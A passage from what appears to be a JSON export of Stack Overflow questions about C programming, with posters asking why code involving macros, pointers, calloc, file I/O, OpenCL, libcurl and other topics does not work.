FOR_EACH_NARG_(...) FOR_EACH_ARG_N(__VA_ARGS__)\n#define FOR_EACH_ARG_N(_1, _2, _3, _4, _5, _6, _7, _8, N, ...) N\n#define FOR_EACH_RSEQ_N() 8, 7, 6, 5, 4, 3, 2, 1, 0\n\n#define FOR_EACH_(N, what, x, ...) CONCATENATE(FOR_EACH_, N)(what, x, __VA_ARGS__)\n#define FOR_EACH(what, x, ...) FOR_EACH_(FOR_EACH_NARG(x, __VA_ARGS__), what, x, __VA_ARGS__)\n</code></pre>\n\n<p>These are my test cases:</p>\n\n<pre><code>// does not work as intended (with one argument)\n#define SOME(x) int x;\nFOR_EACH(SOME, y)\n\n// fine with 2 and more\nFOR_EACH(SOME, y1, y2);\nFOR_EACH(SOME, y3, y4, y5, y6);\n\n// works fine even for one argument\n#define ONLY(x) x\nint FOR_EACH(ONLY, x);\n</code></pre>\n\n<p>Could please someone explain to me what I'm doing wrong for the case with only one argument, <code>#define SOME(x) int x</code>??</p>\n\n<p>Compile it with <code>gcc -E macro.c -o macro.lol</code>, gives result:</p>\n\n<pre><code>int y; int ;  /* &lt;-- that's wrong, why??? */\n\nint y1; int y2;;\nint y3; int y4; int y5; int y6;;\n\n\nint x ;       /* &lt;-- works as supposed */\n</code></pre>\n"},{"tags":["c","linked-list"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":59,"score":0,"question_id":13254218,"title":"Reversing a singly linked list in C","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1801549/reverse-a-singly-linked-list\">Reverse a singly linked list</a>  </p>\n</blockquote>\n\n\n\n<p>This is a C code to reverse a linked list. But this isn't producing the desired output.</p>\n\n<pre><code>struct node *temp,*prev;\nwhile(head-&gt;next!=NULL)\n  {\n    temp=prev=head;\n    while(temp-&gt;next-&gt;next!=NULL)\n      {\n    temp=temp-&gt;next;\n    prev=prev-&gt;next;\n      }\n    temp=temp-&gt;next;\n    temp-&gt;next=prev;\n    prev-&gt;next=NULL;\n  }\n</code></pre>\n\n<p>What am I missing?</p>\n"},{"tags":["c","gcc","inline-assembly","i386"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":38,"score":2,"question_id":13254512,"title":"GCC extended asm, struct element offset encoding","body":"<p>I am trying to write a small piece of my code in GCC style extended asm (x86-64 target) and am having trouble encoding struct offsets.</p>\n\n<p>I have a <code>struct s</code> with a member <code>size_t a[]</code>, a pointer to such a struct and an index both of which are generated within the asm block.</p>\n\n<p>Now I need to address that element in asm</p>\n\n<pre><code>asm (\n    \"mov %[displ](%[s], %[index], 8), %%rbx\"\n    : [s] \"+r\" (s)\n    , [index] \"+r\" (i)\n    : \"memory\", \"cc\", \"rax\", \"rbx\"\n);\n</code></pre>\n\n<p>How can I encode <code>displ</code> into the asm block? Passing <code>offsetof(struct s, a)</code> as an immediate prefixes it with <code>$</code> and generates invalid assembly.</p>\n\n<pre><code>asm (\n    \"mov %[displ](%[s], %[index], 8), %%rbx\"\n    : [s] \"+r\" (s)\n    , [index] \"+r\" (i)\n    : [displ] \"i\" (offsetof(struct s, a))\n    : \"memory\", \"cc\", \"rax\", \"rbx\"\n);\n</code></pre>\n"},{"tags":["c","buffer-overflow"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":13253816,"title":"Armstrong Numbers Bufferoverflow","body":"<p>Currently I am trying to build a program that prints all armstrongnumbers till a certain number. I am getting some odd error when trying to run this. It says bufferoverflow.\nThe part causing it seems to be in main(). Thanks for any help.</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>#include &lt;stdio.h&gt;\n#define MAXIMUM 1000000\n\nint ipow(int x, int power){ \nint z,t;\nt = 0;\nz = x;\nfor (t = 0; t &lt; (power - 1); t++) {\n    z = z * x; }\nreturn z;\n}\n\n\nint getLength(int x) { \n    int a;\n    a = 1;\n    for (a=1;1;a++) { if (x &lt; ipow(10,a) &amp;&amp; x &gt;= ipow(10,(a-1))) return a; }\n}\n\nint getExpSum(int x) { \n    int summe,r,s,t;\n    int digit[8]={0,0,0,0,0,0,0,0};\n    summe=0;\n    s = getLength(x);\n    t = x;\n    r = 1;\n    for (s=getLength(x);s!=0;s--){\n        digit[s] = t % 10;\n        t = t / 10;\n    }\n    for(r=1;r&lt;(getLength(x)+1);r++)\n    {\n        summe = summe + ipow(digit[r],getLength(x));\n    }\n    return summe;\n}\n\nint Armstrong (int x) {\n    if (getExpSum(x)==x) {\n        printf(\"%d ist eine Armstrongzahl\\n\", x);\n        return 1;\n    }\n    return 0;\n}\n\nvoid main(){\n    int z;\n    z = 0;\n    for (z=0;z&lt;MAXIMUM;z++){\n        Armstrong(z+1);\n    }\n}\n</code></pre>\n"},{"tags":["c","multithreading","kernel","opencl","gpu"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13253693,"title":"Can someone explain what is wrong with this OpenCL program?","body":"<p>I've included the main parts of the host program which I suspect to be incorrect here:</p>\n\n<p><a href=\"http://pastebin.com/qVkv9E11\" rel=\"nofollow\">http://pastebin.com/qVkv9E11</a></p>\n\n<p>I'm not that great with pointers yet and think I may have allocated some variables wrong.</p>\n\n<p>Here is the Kernel program which should give an idea of what my program is trying to do:</p>\n\n<pre><code>    const char *KernelSource =           \"\\n\"\n\"__kernel void sumElements(           \\n\"\n\"   __global float* input,            \\n\"\n\"   __global float output,            \\n\"\n\"   __global int N)                   \\n\"\n\"{                                    \\n\"\n\"   int i = get_global_id(0);         \\n\"\n\"   if(i &lt; N)                         \\n\"\n\"       output += input[i];           \\n\"\n\"}                                    \\n\"\n\"\\n\";\n</code></pre>\n\n<p>Perhaps this is causing the error as I've never tried SIMT writing to one variable as above. Is it possible to do such a thing? I need to get the sum of all the elements in the array.</p>\n"},{"tags":["objective-c","c"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":42,"score":3,"question_id":13253920,"title":"How to return generated array from c function to objective-c","body":"<p>Need to generated some random 10 byte length string in c function and call the function from objective-c. So, I'm creating a pointer to uint8_t and passing it to C function. The function generates random bytes and assigns them to *randomString. However, after returning from function to objective-c randomValue pointer points to NULL.</p>\n\n<p>Here's my random function in C:</p>\n\n<pre><code>void randomString(uint8_t *randomString)\n{\n  randomString = malloc(10);\n\n  char randomByte;\n  char i;\n  for (i = 0; i &lt; 10; i++) {\n\n    srand((unsigned)time(NULL));\n    randomByte = (rand() % 255 ) + 1;\n    *randomString = randomByte;\n    randomString++; \n  }\n} \n</code></pre>\n\n<p>Here's objective-c part:</p>\n\n<pre><code>uint8_t *randomValue = NULL;\nrandomString(randomValue); //randomValue points to 0x000000\n\nNSString *randomString = [[NSString alloc] initWithBytes:randomValue length:10 encoding:NSASCIIStringEncoding];\nNSLog(@\"Random string: %@\", randomString);\n</code></pre>\n"},{"tags":["c","gcc","warnings"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":13249756,"title":"Explicit ignore warning from -Wcast-qual: cast discards ‘__attribute__((const))’ qualifier from pointer target type","body":"<pre><code>static char buf[8];\nvoid foo(){\n    const char* ptr = buf;\n    /* ... */\n    char* q = (char*)ptr;\n}\n</code></pre>\n\n<p>The above snippet will generate <code>\"warning: cast discards ‘__attribute__((const))’ qualifier from pointer target type [-Wcast-qual]\"</code>. I like <code>-Wcast-qual</code> since it can help me from accidentally writing to memory I shouldn't write to.</p>\n\n<p>But now I want to cast away const for only a single occurrence (not for the entire file or project). The memory it is pointing to is writable (just like <code>buf</code> above). I'd rather not drop const from <code>ptr</code> since it is used elsewhere and keeping to pointers (one const and one non-const) seems like a worse idea.</p>\n"},{"tags":["java","c++","c","eclipse","eclipse-plugin"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":179,"score":3,"question_id":10987093,"title":"Eclipse Problems View Double Click","body":"<p>I am trying to create a double click mouse event for the Problems View in Eclipse. I am creating a plugin that needs to get the data about the problem the user double clicks in the problems view. </p>\n\n<p>A few details: I am coding in java but the user will be using the CDT plugin for coding in C/C++. So far I have been unable to get the data from the current selection in the problems view.</p>\n\n<p>Any ideas? </p>\n"},{"tags":["c","pointers","strcmp"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":81,"score":0,"question_id":13253113,"title":"strcmp with pointers not working in C","body":"<p>Why this code isn't working. Just trying to check if the user input is the same as a password</p>\n\n<pre><code>char *pass;\n\nprintf(\"Write the password: \");\nscanf(\"%s\", pass); // Because is a pointer the &amp; is out ?\n\n\nif( strcmp( pass , \"acopio\") == 0)\n</code></pre>\n"},{"tags":["c"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":13251436,"title":"using r+ to modify text file","body":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\n\n// number of salesman \n#define SIZE 100\n// salesman_type structure definition\ntypedef struct{\n        int ID; // salesman id\n        char id_txt[6]; // salesman id for txt file\n        char name[50]; // salesman name\n        double hor_total; // total sales amount of a salesman  \n    }salesman_type; // end structure salesman_type\n\nsalesman_type salesman[SIZE];// synonym for salesman_type \n\n// function prototype\nint sale_menu(); \nvoid modifySales();\n\n// sales processing system menu function\nint sale_menu()\n{\n    int menu;\n    system(\"cls\");\n    printf(\"Sales Processing System\\n\");\n    printf(\"-----------------------\\n\\n\");\n    printf(\"1. Add Salesman Records\\n\");\n    printf(\"2. Reports Generation\\n\");\n    printf(\"3. Modify Salesman Records\\n\");\n    printf(\"4. Delete Salesman Records\\n\\n\");\n    printf(\"0. Exit\\n\");\n    printf(\"Your choice: \");\n    scanf(\"%d\", &amp;menu);\n    return menu;\n    printf(\"\\n\");\n}// end function sale_menu\n\n// modify salesman records function \nvoid modifySales()\n{\n    FILE *salesPtr; // sales.txt file pointer\n    FILE *salesmanPtr; // salesman.txt file pointer\n    int a = 1, b, modify; // counter \n    double sale[SIZE][4]; // quartely sales amount\n\n    // fopen opens the file; exits program if file cannot be opened\n    if ( (salesPtr = fopen(\"sales.txt\",\"r+\")) == NULL )\n    {\n        printf(\"Cannot open sales.txt\\n\"); // display error message \n        system(\"pause\"); // pause program before it exits\n        exit(-1); // end program \n    } // end if\n    else\n    {\n        // prompt and read salesman id\n        printf(\"\\nSalesman ID (NO.): \");\n        scanf(\"%d\",&amp;modify);\n\n        // if it is not required salesman id\n        while (a != modify)\n        {\n            fscanf(salesPtr,\"%*[^\\n]\\n\");\n            a++;\n        }\n\n        fscanf(salesPtr,\"%*[^|]|\", salesman[0].id_txt);\n        // read quarterly sales amount\n        for (b=0; b&lt;4; b++)\n        {   \n            // prompt and read quarterly sales amount\n            printf(\"Quarter %d: \", b+1);\n            scanf(\"%lf\",&amp;sale[0][b]);\n            // end with \"|\" symbol if b is less than 3\n            if(b&lt;3)\n            {\n                fprintf(salesPtr,\"%.2f|\",sale[0][b]);\n            }\n            else\n            {\n                fprintf(salesPtr,\"%.2f\\n\",sale[0][b]);\n            }\n        } // end for\n    } // end else\n    fclose(salesPtr); // fclose close the file\n} // end function modifySales \n\n// function main begins program execution\nint main()\n{\n    // variable declaration\n    int a, b, c = 0, last; // counter\n    int getMenu = 10, getReport = 10; // menu selector\n\n    while (getMenu != 0)\n    {\n        // call and assign sale_menu function to getMenu\n        // Execute command based on user input\n        switch(getMenu = sale_menu())\n        {\n            case 1:\n                break;\n            case 2:\n                break;\n            case 3:\n                modifySales();\n                break;\n        } // end switch\n    }// end while \n    return 0;\n} // end main\n</code></pre>\n\n<p>Steps to reproduce issue\n1) Choose 3. Modify Salesman Records\n2) input 1 for salesman id\n3) all input 1 for quarterly sales amount</p>\n\n<p>I expect the first salesman of quarterly sales amount all change to 1 but it didn't. What's wrong with my code?</p>\n\n<p>text file\n<a href=\"https://www.dropbox.com/s/p5nsdc9j8nwyduu/sales.txt\" rel=\"nofollow\">https://www.dropbox.com/s/p5nsdc9j8nwyduu/sales.txt</a></p>\n"},{"tags":["c","file","binary"],"answer_count":5,"favorite_count":1,"up_vote_count":18,"down_vote_count":0,"view_count":482,"score":18,"question_id":13252697,"title":"Writing bits to a file in C","body":"<p>I have this string: \"101\"\nI want to write it to a file, in C, not as text: \"101\" and so 8 bits x char. but directly use the string as bits: the bit \"1\", the bit \"0\" and the bit \"1\", so that the file will be of 3 bits.</p>\n\n<p>Is it possibile?\nI searched on the web and I tried doing this:</p>\n\n<pre><code>char c[25] = \"101\";\nFILE *binFile = fopen(\"binFile.bin\", \"wb\");\nint x = atoi(c);\nfwrite(&amp;x, sizeof(x), 1, binFile);\n</code></pre>\n\n<p>But at the end, when I verify files's bytes, Windows says me that it is 4bytes file! And not 3bits!</p>\n\n<p>How can I do this, if it is possible? Thanks a lot.</p>\n"},{"tags":["c++","c","networking","multiplexing"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":13251925,"title":"Searching for C/C++ network library with multiplexing","body":"<p>I'm writing an application that has a number (hundreds) of concurrent network operations running in parallel between two instances. Since the average lifetime of a connection is quite short (at most seconds), I thought that the overhead of using many TCP connections and doing a handshake every time (especially for a TLS handshake) would be too large.</p>\n\n<p>I started to look at a couple of protocols and libraries implementing multiplexing (mostly <a href=\"http://en.wikipedia.org/wiki/AMQP\" rel=\"nofollow\">AMQP</a> implementations like <a href=\"http://qpid.apache.org/\" rel=\"nofollow\">Apache Qupid</a>, <a href=\"http://www.rabbitmq.com/\" rel=\"nofollow\">RabbitMQ</a>, as mentioned in answers to <a href=\"http://stackoverflow.com/questions/1919472/low-latency-large-scale-message-queuing\">this question</a>). However all of them seem to run over TCP, which introduces some overhead and doesn't make a lot of sense (<a href=\"http://www.250bpm.com/multiplexing\" rel=\"nofollow\">this post</a> explains the problem quite well and comes to the conclusion that TCP multiplexing is stupid). Also all of them feel quite fat, I'd prefer something small and light (<a href=\"http://www.zeromq.org/\" rel=\"nofollow\">ZeroMQ</a> unfortunately doesn't implement multiplexing afaik). That got me thinking whether using UDP would be an option. Of course one has to implement stuff like recovery and ACKs properly, but with the knowledge about the multiple streams over the connection that should be much more efficient than simply using TCP.</p>\n\n<p>Do you think that my reasoning above is correct, or did I miss something important? Are there any good C/C++ libraries out there that implement multiplexing via UDP?</p>\n"},{"tags":["c++","c","pointers","memory-management"],"answer_count":4,"favorite_count":0,"up_vote_count":10,"down_vote_count":0,"view_count":103,"score":10,"question_id":13249367,"title":"Query about memory location","body":"<p>Suppose there is a variable <code>a</code> and a pointer <code>p</code> which points to address of <code>a</code>.</p>\n\n<pre><code>int a;\nint *p=&amp;a;\n</code></pre>\n\n<p>Now since I have a pointer pointing to the location of the variable, I know the exact memory location (or the chunk of memory).</p>\n\n<p>My questions are:</p>\n\n<ol>\n<li>Given an address, can we find which variable is using them? (I don't think this is possible).</li>\n<li>Given an address, can we atleast find how big is the chunk of memory to which that memory address belongs. (I know this is stupid but still).</li>\n</ol>\n"},{"tags":["c++","c","usb","driver"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":83,"score":-1,"question_id":13238654,"title":"How can I write my own USB device driver?","body":"<p>I'm working on a project and I'd like to exchange the Driver wich is on the USB Device ( buy a new USB Data Storage Device and you'll see it installs it self :) ).\nIs just want to change that my own Driver will be installed. \nHow can I do that using C/C++ ?</p>\n\n<p>Thank you </p>\n\n<p>( I just want to writte my own driver for Windows )</p>\n"},{"tags":["objective-c","c"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":13252441,"title":"How to release a struct that was passed by reference to c code and its member was malloc'ed there?","body":"<p>I'm getting \"malloc: <em>*</em> error for object 0xbfffe160: pointer being freed was not allocated\" when trying to free memory (in objective-c code) of an object that was allocated inside c function. This C function creates and returns binary data packet that is used as NSData later. Here's my obj-c code part where I'm creating struct variable and passing it by reference to C function:</p>\n\n<pre><code>MyPacket packetRef;\nallocAuthentificationCodePacket(&amp;packetRef);\n\nNSData *data = [NSData dataWithBytes:packetRef.bytes length:packetRef.packet-&gt;packetSize];\nfree(&amp;packetRef); // getting error\n</code></pre>\n\n<p>Everything work fine, except I'm trying to release the memory because the data should be retained by NSData variable. The C functions performs calloc inside itself, so I should somehow to release that memory:</p>\n\n<pre><code>packetRef-&gt;bytes = calloc(1, sizeof(*packetRef));\n</code></pre>\n\n<p>Here's are my structs for storing binary data:</p>\n\n<pre><code>typedef struct {\n\n  uint8_t packetType;\n  uint16_t packetBody;\n\n} MyStruct;\n</code></pre>\n\n<p>and another struct:</p>\n\n<pre><code>typedef union {\n\n  const uint8_t *bytes; \n  MyStruct *packet;\n\n} MyPacket;\n</code></pre>\n\n<p>How should I free the memory? The error I'm getting is not crash, it just a message in debug console when running unit tests.</p>\n\n<p><strong>UPDATE</strong>. Tried to release \"bytes\" struct member but getting the same error message:</p>\n\n<pre><code>free(&amp;packetRef.bytes);\n</code></pre>\n\n<p><strong>UPDATE2</strong>. Thanks, the suggested way did worked and malloc error message disappeared from console:  </p>\n\n<pre><code>free(packetRef.bytes);\n</code></pre>\n\n<p>However, getting a warning in Xcode \"Passing 'const uint8_t *' (aka 'const unsigned char *') to parameter of type 'void *' discards qualifiers\". I'm using Apple LLVM 4.1 compiler. C function resides in separate file and only a header is included because Android guys will have to reuse it. </p>\n\n<p><strong>UPDATE3</strong>. Thanks to @simonc and @nos who have pointed out the struct member \"bytes\" has const. The warning has disappeared after removing const. The initial idea of using const was to protect \"bytes\" from modification.</p>\n"},{"tags":["c","sockets","ipv6","multicast","multicastsocket"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":38,"score":2,"question_id":13246410,"title":"ipv6 multicast reception","body":"<p>I'm unable to receive the multicast packets sent by the server. I could see the packets being received via tcpdump. Can anyone please let me know what am I doing wrong here.Thanks.</p>\n\n<pre><code>struct ipv6_mreq mreq;\nstruct sockaddr_in6 servaddr;\n\nsock = socket(AF_INET6,SOCK_DGRAM,0);\n\nservaddr.sin6_family = AF_INET6;\nservaddr.sin6_port = htons(61624);\nservaddr.sin6_addr = in6addr_any;\n\ninet_pton(AF_INET6,\"ff38:40:2001::1\",&amp;mreq.ipv6mr_multiaddr);\n\nmreq.ipv6mr_interface = 0;\nsetsockopt(sock,IPPROTO_IPV6,IPV6_JOIN_GROUP, &amp;mreq,sizeof(mreq));\nbind(sock,(struct sockaddr *)&amp;servaddr,sizeof(servaddr));\n/* using poll to receive data */\n</code></pre>\n"},{"tags":["c","shell","script"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":36,"score":-1,"question_id":13252531,"title":"how to get shell script output into c structure variable","body":"<p>I need to collect shell script output into my c program linked list node, I have tried popen() also. But typecast error occur there. I need this in my project.\nplease help...... </p>\n"},{"tags":["c","http","curl","get","libcurl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":13236479,"title":"libcurl http get request in json format","body":"<p>Is there a way to send a HTTP get request using libcurl in JSON format?</p>\n\n<p>My current request is </p>\n\n<p><code>curl_easy_setopt(curl_handle, CURLOPT_URL, \"http://localhost:9200/_search?q=tag:warcraft\")</code></p>\n\n<p>using libcurl. It's equivalent in curl is</p>\n\n<pre><code>curl -XGET http://localhost:9200/_all/tweet/_search?q=tag:warcraft\n</code></pre>\n\n<p>I would like to send the following curl request (in json format) using libcurl.</p>\n\n<pre><code>curl -XGET http://localhost:9200/_search -d '{\n    \"query\" : {\n        \"term\" : { \"tag\": \"warcraft\" }\n    }\n}'\n</code></pre>\n\n<p>I would like to know the equivalent libcurl code to send the above request. Thanks.</p>\n"},{"tags":["c","timer"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":13239129,"title":"A simple timeout function","body":"<p>I came across a timeout function in a product line code which get me really confused:</p>\n\n<pre><code>int TestTimeOut(unsigned long Timed_Val1, unsigned long Timed_Val2)\n{\n    Timed_Val2 = Timed_Val1 + (Timed_Val2 * 200);\n    if (((Timed_Val1 &gt; Timed_Val2) &amp;&amp; (sys_msec &lt; Timed_Val1) &amp;&amp; (sys_msec &gt; Timed_Val2)) || ((Timed_Val1 &lt; Timed_Val2) &amp;&amp; ((sys_msec &lt; Timed_Val1) || (sys_msec &gt; Timed_Val2))))\n        return TRUE;\n    return FALSE;\n}\n</code></pre>\n\n<p>And here is how it's used:</p>\n\n<pre><code>unsigned long Timeout = sys_msec;\n#define MAX_TIMEOUT   15L\n\n    while (!com_eot(1))  //to check if some transmission in progress in COM1\n        if (TestTimeOut(Timeout, MAX_TIMEOUT))\n            return FALSE;\n    return TRUE;\n</code></pre>\n\n<p>How does it work? I am totally confused by the 3 lines in TestTimeOut(). Thanks,</p>\n"},{"tags":["iphone","c","object"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":9,"score":0,"question_id":13252525,"title":"how to make mkmapview transparent to show location on compass image?","body":"<p>Please tell me, How to show user location on compass image for that how can i make transparent mapview how to get subviews of mapview to set alpha.</p>\n"},{"tags":["c","compiler-errors"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":136,"score":-2,"question_id":10105660,"title":"compile error: expected expression before ‘{’ token","body":"<p>I am getting the error</p>\n\n<pre>error: expected expression before ‘{’ token</pre>\n\n<p>when trying to compile the following code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n    int main()\n    {\nsrand (time(NULL));\nint Seat[10] = {0,0,0,0,0,0,0,0,0,0};\nint x = rand()%5;\nint y = rand()%10;\n\nint i, j;\ndo {\n    printf(\"What class would you like to sit in, first (1) or economy (2)?\");\n    scanf(\"%d\", &amp;j);\n    if(j == 1){\n        Seat[x] = 1;\n        printf(\"your seat number is %d and it is type %d\\n\", x, j);\n        }\n    else{\n        Seat[y] = 1;\n        printf(\"your seat number is %d and is is type %d\\n\", y, j);\n        }\n    }while(Seat[10] != {1,1,1,1,1,1,1,1,1,1});\n   }\n</code></pre>\n\n<p>Background: The program is designed to be an airline seat reservation system.</p>\n"},{"tags":["c#","c++","c","optimization","performance-measurement"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":53,"score":2,"question_id":13213348,"title":"Measure memory used by code","body":"<p>I would like to make better some methods in C# or C++ or C.<br/>\nTo measure time I can use Stopwatch class, but additionally I would like to measure memory reserved by exterminated code. Do you know any class or method which has similar properties to MemoryMeasure class used in code below?</p>\n\n<pre><code>Stopwatch s1 = Stopwatch.StartNew();\nMemoryMeasure m1 = MemoryMeasure.Start();\nfor (int i = 0; i &lt; m; i++)\n{\n//some compute\n//for example\n//var x = new LargeObject(new SmallObject(), 45);\n//some compute\n//some compute\n}\nm1.Stop();\ns1.Stop();\n\nConsole.Writeline(\"Your code was executed in \" + s1.ElapsedMilliseconds + \"ms\");\nConsole.Writeline(\"Your code ate \" + m1.UsedMemory + \"MB of memory\");\n</code></pre>\n"},{"tags":["c","memory-management","dynamic","aix","calloc"],"answer_count":1,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":116,"score":5,"question_id":13245312,"title":"calloc fails and returns NULL","body":"<p>in one of our application's module, calloc() is failing and returning NULL. The amount of memory that it is trying to allocate is of structure which is of 9292 bytes. The operating system is AIX 7.1 and running VIOS 2.2.1.3.</p>\n\n<p>The machine has 2+GB ram and does not seems to have an issue with lack of memory. The same application module is running fine on one of the other boxes, which has same configurations as the problematic box.Following is a snippet of memory from both the boxes and they are same !</p>\n\n<p>WORKING BOX:</p>\n\n<pre>\nRLIMIT_AS      (infinite) (infinite)\nRLIMIT_CORE    1073741312 (infinite)\nRLIMIT_CPU     (infinite) (infinite)\nRLIMIT_DATA     134217728 (infinite)\nRLIMIT_FSIZE   (infinite) (infinite)\nRLIMIT_NOFILE        2000 (infinite)\nRLIMIT_RSS       33554432 (infinite)\nRLIMIT_STACK     33554432 2147483646 \n</pre>\n\n<p>PROBLEMATIC BOX:</p>\n\n<pre>\nRLIMIT_AS      (infinite) (infinite)\nRLIMIT_CORE    1073741312 (infinite)\nRLIMIT_CPU     (infinite) (infinite)\nRLIMIT_DATA     134217728 (infinite)\nRLIMIT_FSIZE   (infinite) (infinite)\nRLIMIT_NOFILE        2000 (infinite)\nRLIMIT_RSS       33554432 (infinite)\nRLIMIT_STACK     33554432 2147483646 \n</pre>\n\n<p>I'm clueless as can't really figure out why calloc() is failing even for 9292 bytes on this box.</p>\n\n<p>Thanks</p>\n"},{"tags":["c","variables"],"answer_count":8,"favorite_count":0,"up_vote_count":3,"down_vote_count":5,"view_count":79,"score":-2,"question_id":13251629,"title":"No names for variables?","body":"<p>I want to be able to take input with a function but I want to store the information. Is there anyway to declare a variable that doesn't have a name and only can be accessed by a pointer?</p>\n\n<p>something like this:</p>\n\n<pre><code>float* = float NULL 5;\n</code></pre>\n\n<p>Thanks.</p>\n\n<p>EDITED: What I needed to do was to have an infinite amount of arrays that store a very large amount of ints. However, I am loading all this data from files and I need to access it from many other classes. I know how many times the function is run so i can keep them in an array but I don't know how many ints are or potentially are loaded </p>\n\n<p>So the pointers son't need to have names because they will be stored in an array to be used later. I just wanted to be able to create global variables multiple times and just access them from an array.</p>\n"},{"tags":["c","ncurses"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":31,"score":-1,"question_id":13251853,"title":"delwin(),endwin(), not working inside a condiional statement","body":"<p>As per logic, the below code must end the window and must return the console window with output of ls but its returning the window with a black background and in that window every command is running but it is not displayed that what i am writing and output is coming in a pretty unusual manner even though i had not used noecho().</p>\n\n<pre><code>else if(selected_item==0){\n  wprintw(messagebar,\"You have selected menu SHAILENDRA SINGH.\",1);\n  write_data0();\n  if(fork())\n    wait(0);\n  else\n    execlp(\"clear\",\"clear\",(char *)NULL);\n  execlp(\"ls\",\"ls\",(char *)NULL);\n  execlp(\"konsole\",\"konsole\",(char *)NULL);\n  ESCAPE;\n  refresh();\n  delwin(menubar);\n  delwin(messagebar);\n\n  endwin();\n}\n</code></pre>\n\n<p>need help and suggestion in removing this bug in my code.</p>\n"},{"tags":["c","getopt"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":33,"score":2,"question_id":13251732,"title":"optstring in getopt function","body":"<p>I'm not sure how to use optstring in getopt function in C. \nHow should that string look like? I saw examples where letters are next to each other, sometimes are separated by one semicolon, sometimes by two semicolons.</p>\n\n<p>I cant't find what does it mean. Could you clarify?</p>\n"},{"tags":["c","libpng"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":18,"score":1,"question_id":13251744,"title":"Meaning of the third argument in png_read_row(s)?","body":"<p>In libpng there are several functions provided that allow reading of the image on the by-row basis.</p>\n\n<p>Here is how they are declared:</p>\n\n<pre><code>void png_read_row (png_structp png_ptr, png_bytep row,    png_bytep display_row)\nvoid png_read_rows (png_structp png_ptr, png_bytepp row,    png_bytepp display_row, png_uint_32 num_rows)\n</code></pre>\n\n<p>What is the meaning of their third arguments? In libpng manual they are set to NULL, where their usage is shown.</p>\n"},{"tags":["c","static","struct","initialization"],"answer_count":4,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":81,"score":6,"question_id":13251083,"title":"The initialization of static variable in C","body":"<p>I have a question question about initialization of static variable in C, I know if we declare a global static variable, but default, the value is <code>0</code>, for example:</p>\n\n<pre><code>static int a; //althrough we do not initiaize it, the value of a is 0\n</code></pre>\n\n<p>but what about the following data structure:</p>\n\n<pre><code>typedef struct\n{\n    int a,\n    int b,\n    int c,\n} Hello;\n\nstatic Hello[3] hello;\n</code></pre>\n\n<p>are all of the members in each struct of <code>hello[0]</code>, <code>hello[1]</code>, <code>hello[2]</code> initiaized as <code>0</code>?</p>\n"},{"tags":["c"],"answer_count":2,"favorite_count":1,"up_vote_count":6,"down_vote_count":1,"view_count":61,"score":5,"question_id":13251499,"title":"calloc(), pointers and all bits zero","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/9894013/is-null-always-zero-in-c\">Is NULL always zero in C?</a>  </p>\n</blockquote>\n\n\n\n<p>The C standard states the following for <code>calloc()</code>:</p>\n\n<blockquote>\n  <p>The calloc function allocates space for an array of nmemb objects, each of whose size is size. The space is initialized to all bits zero.</p>\n</blockquote>\n\n<p>with the following caveat relating to <em>all bits zero</em>:</p>\n\n<blockquote>\n  <p>Note that this need not be the same as the representation of floating-point zero or a null pointer constant.</p>\n</blockquote>\n\n<p>Test program:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main()\n{\n    char** list = calloc(10, sizeof(*list));\n    int i;\n    for (i = 0; i &lt; 10; i++)\n    {\n        printf(\"%p is-null=%d\\n\", list[i], NULL == list[i]);\n    }\n    free(list);\n\n    return 0;\n}\n</code></pre>\n\n<p>I built and executed this program with the following compilers:</p>\n\n<ul>\n<li>VC7, VC8, VC9, VC10</li>\n<li>gcc v4.1.2, <a href=\"http://ideone.com/TNHoAF\" rel=\"nofollow\">gcc v4.3.4</a></li>\n<li>Forte 5.8, Forte 5.10</li>\n</ul>\n\n<p>In all cases <em>all bits zero</em> is a <code>NULL</code> pointer (unless I made a mistake in the test program).</p>\n\n<p>What is the reason a <code>NULL</code> pointer is not guaranteed by the C standard to be <em>all bits zero</em> ? Out of curiousity, are there any compilers where <em>all bits zero</em> is not a <code>NULL</code> pointer 